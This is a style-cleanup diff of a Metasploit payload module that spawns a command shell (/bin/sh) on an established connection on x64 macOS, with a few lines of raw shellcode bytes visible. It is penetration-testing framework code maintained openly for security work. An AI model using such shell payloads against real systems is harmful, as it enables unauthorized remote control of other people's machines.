@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 107
 
   include Msf::Payload::Single
@@ -18,22 +18,21 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'OSX Command Shell, Find Tag Inline',
-      'Description'   => 'Spawn a shell on an established connection (proxy/nat safe)',
-      'Author'        => 'nemo <nemo[at]felinemenace.org>',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'osx',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::FindTag,
-      'Session'       => Msf::Sessions::CommandShellUnix
-
-      ))
-      # exec payload options
-      register_options(
-        [
-          OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
-          OptString.new('TAG',  [ true,  "The tag to test for", "NEMO" ]),
-      ], self.class)
+                     'Name'          => 'OSX Command Shell, Find Tag Inline',
+                     'Description'   => 'Spawn a shell on an established connection (proxy/nat safe)',
+                     'Author'        => 'nemo <nemo[at]felinemenace.org>',
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'osx',
+                     'Arch'          => ARCH_X64,
+                     'Handler'       => Msf::Handler::FindTag,
+                     'Session'       => Msf::Sessions::CommandShellUnix))
+    # exec payload options
+    register_options(
+      [
+        OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
+        OptString.new('TAG',  [ true,  "The tag to test for", "NEMO" ])
+      ], self.class
+    )
   end
 
   #
@@ -79,5 +78,4 @@ module MetasploitModule
       "\x48\x89\xE6" +                    # mov rsi,rsp
       "\x0F\x05"                          # loadall286
   end
-
 end
